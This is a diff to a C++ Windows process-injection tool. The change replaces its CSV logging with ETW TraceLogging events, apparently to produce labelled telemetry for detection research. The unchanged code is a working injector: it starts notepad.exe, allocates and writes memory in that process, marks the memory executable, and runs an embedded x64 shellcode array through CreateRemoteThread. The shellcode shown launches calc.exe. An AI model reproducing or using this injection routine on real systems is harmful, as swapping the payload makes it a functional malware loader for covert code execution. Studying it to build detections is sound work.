@@ -3,86 +3,27 @@
 #include <iomanip>
 #include <fstream>
 #include <sstream>
+#include <TraceLoggingProvider.h>
 
-// global CSV output stream
-std::ostringstream csv;
-std::string myType = "Attack";
-std::string myProvider = "Injector";
-std::string myEventID = "1337";
-int PID = 0;
 
 // paths
 std::string outFile = "C:\\Users\\Public\\Downloads\\attack-output.csv";
 LPCWSTR newProcessToInjectTo = L"C:\\Windows\\System32\\notepad.exe";
 
-// get current timestamp in ISO 8601 format, e.g. 2025-08-18 18:03:51.123Z
-std::ostringstream printCurrentTime() {
-    static LARGE_INTEGER qpcFreq = {};
-    static LARGE_INTEGER qpcBase = {};
-    static ULONGLONG filetimeBase = 0;
-
-    // Initialize mapping once
-    if (qpcFreq.QuadPart == 0) {
-        QueryPerformanceFrequency(&qpcFreq);
-
-        FILETIME ft;
-        GetSystemTimeAsFileTime(&ft);
-
-        ULARGE_INTEGER uli;
-        uli.LowPart = ft.dwLowDateTime;
-        uli.HighPart = ft.dwHighDateTime;
-        filetimeBase = uli.QuadPart;
-
-        QueryPerformanceCounter(&qpcBase);
-    }
-
-    // Current QPC
-    LARGE_INTEGER qpcNow;
-    QueryPerformanceCounter(&qpcNow);
-
-    // Convert QPC delta to 100ns units
-    ULONGLONG qpcTicks = static_cast<ULONGLONG>(qpcNow.QuadPart - qpcBase.QuadPart);
-    ULONGLONG hundredNsDelta = (qpcTicks * 10000000ULL) / qpcFreq.QuadPart;
-
-    // Final FILETIME in 100ns intervals since 1601
-    ULONGLONG filetimeNow = filetimeBase + hundredNsDelta;
-
-    // Convert back to SYSTEMTIME for human readable part
-    FILETIME ftNow;
-    ftNow.dwLowDateTime = static_cast<DWORD>(filetimeNow & 0xFFFFFFFF);
-    ftNow.dwHighDateTime = static_cast<DWORD>(filetimeNow >> 32);
-
-    SYSTEMTIME stUTC;
-    FileTimeToSystemTime(&ftNow, &stUTC);
-
-    // Fractional seconds: remainder in 100ns ticks
-    const ULONGLONG TICKS_PER_SEC = 10000000ULL;
-    ULONGLONG frac_ticks = filetimeNow % TICKS_PER_SEC;
-    double fractional = static_cast<double>(frac_ticks) / TICKS_PER_SEC;
-
-    std::ostringstream oss;
-    oss << std::setfill('0')
-        << std::setw(4) << stUTC.wYear << "-"
-        << std::setw(2) << stUTC.wMonth << "-"
-        << std::setw(2) << stUTC.wDay << " "
-        << std::setw(2) << stUTC.wHour << ":"
-        << std::setw(2) << stUTC.wMinute << ":"
-        << std::setw(2) << stUTC.wSecond << "."
-        << std::setw(7) << std::setfill('0') << static_cast<int>(fractional * 10000000ULL)
-        << "Z";
-
-    std::cout << "[+] " << oss.str() << " > ";
-    return oss;
-}
+// my attack provider
+TRACELOGGING_DEFINE_PROVIDER(
+    g_hProvider,
+    "Injector-Attack", // name in the ETW
+    (0x72248466, 0x7166, 0x4feb, 0xa3, 0x86, 0x34, 0xd8, 0xf3, 0x5b, 0xb6, 0x37)  // the random GUID
+);
 
 
-void printAndAddToCsv(std::string msg) {
-    csv << printCurrentTime().str() << ","
-		<< myType << ","
-		<< myProvider << ","
-        << myEventID << ","
-        << PID << ","
-        << msg << "\n";
+void print_and_emit_event(std::string msg) {
+    TraceLoggingWrite(
+        g_hProvider,
+        "Injector Event", // this is the event name
+		TraceLoggingValue(msg.c_str(), "message")
+    );
     std::cout << msg << "\n";
 }
 
@@ -108,13 +49,11 @@ int main(int argc, char** argv) {
         }
     }
 
-    csv << "timestamp,type,attack,event_id,PID,message\n";
     std::ostringstream msg;
 
     // print current 
-	PID = GetCurrentProcessId();
-    msg << "Injector started with PID " << PID;
-    printAndAddToCsv(msg.str()); msg.str("");
+    msg << "Injector started with PID " << GetCurrentProcessId();;
+    print_and_emit_event(msg.str()); msg.str("");
 
     switch (s) {
         case NoWait:
@@ -132,6 +71,9 @@ int main(int argc, char** argv) {
             break;
     }
 
+	// start ETW provider
+    TraceLoggingRegister(g_hProvider);
+
     // start new process to inject to
     STARTUPINFO si = { sizeof(si) };
     PROCESS_INFORMATION pi;
@@ -141,7 +83,7 @@ int main(int argc, char** argv) {
     }
 
     msg << "New process started with PID " << pi.dwProcessId;
-    printAndAddToCsv(msg.str()); msg.str("");
+    print_and_emit_event(msg.str()); msg.str("");
 
     // open process with read/write access
     HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pi.dwProcessId);
@@ -154,10 +96,10 @@ int main(int argc, char** argv) {
     BYTE shellcode[] = { 0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, 0x00};
 
     // allocate memory to new process
-    LPVOID remoteAddrShellCode = VirtualAllocEx(hProcess, nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (remoteAddrShellCode) {
-        msg << "Memory allocated at address " << remoteAddrShellCode;
-        printAndAddToCsv(msg.str()); msg.str("");
+    LPVOID remote_addr = VirtualAllocEx(hProcess, nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (remote_addr) {
+        msg << "Memory allocated at address " << remote_addr;
+        print_and_emit_event(msg.str()); msg.str("");
     }
     else {
         std::cerr << "[!] Failed to allocate memory: " << GetLastError() << "\n";
@@ -165,45 +107,40 @@ int main(int argc, char** argv) {
     }
 
     // write value into process' memory
-    SIZE_T bytesWritten;
-    if (WriteProcessMemory(hProcess, remoteAddrShellCode, &shellcode, sizeof(shellcode), &bytesWritten)) {
-        msg << "Shellcode written to address " << remoteAddrShellCode;
-        printAndAddToCsv(msg.str()); msg.str("");
+    SIZE_T bytes_written;
+    if (WriteProcessMemory(hProcess, remote_addr, &shellcode, sizeof(shellcode), &bytes_written)) {
+        msg << "Shellcode written to address " << remote_addr;
+        print_and_emit_event(msg.str()); msg.str("");
     }
     else {
         std::cerr << "[!] Failed to write memory: " << GetLastError() << "\n";
         return 1;
     }
 
-
 	// change memory protection to executable
-    DWORD oldProtect;
-    if (VirtualProtectEx(hProcess, remoteAddrShellCode, sizeof(shellcode), PAGE_EXECUTE_READ, &oldProtect)) {
+    DWORD old_protect;
+    if (VirtualProtectEx(hProcess, remote_addr, sizeof(shellcode), PAGE_EXECUTE_READ, &old_protect)) {
         msg << "Memory protection changed to PAGE_EXECUTE_READ";
-        printAndAddToCsv(msg.str()); msg.str("");
+        print_and_emit_event(msg.str()); msg.str("");
     }
     else {
         std::cerr << "[!] Failed to change memory protection: " << GetLastError() << "\n";
-        VirtualFreeEx(hProcess, remoteAddrShellCode, 0, MEM_RELEASE);
+        VirtualFreeEx(hProcess, remote_addr, 0, MEM_RELEASE);
         CloseHandle(hProcess);
         return 1;
     }
 
 	// call create remote thread
-    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteAddrShellCode, nullptr, 0, nullptr);
+    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)remote_addr, nullptr, 0, nullptr);
     if (hThread) {
         msg << "Remote thread created successfully";
-        printAndAddToCsv(msg.str()); msg.str("");
+        print_and_emit_event(msg.str()); msg.str("");
     }
     else {
         std::cerr << "[!] Failed to create remote thread: " << GetLastError() << "\n";
         return 1;
 	}
 
-	// write the csv variable to a file
-    std::ofstream out(outFile);
-    out << csv.str();
-    out.close();
-
+    TraceLoggingUnregister(g_hProvider);
     return 0;
 }
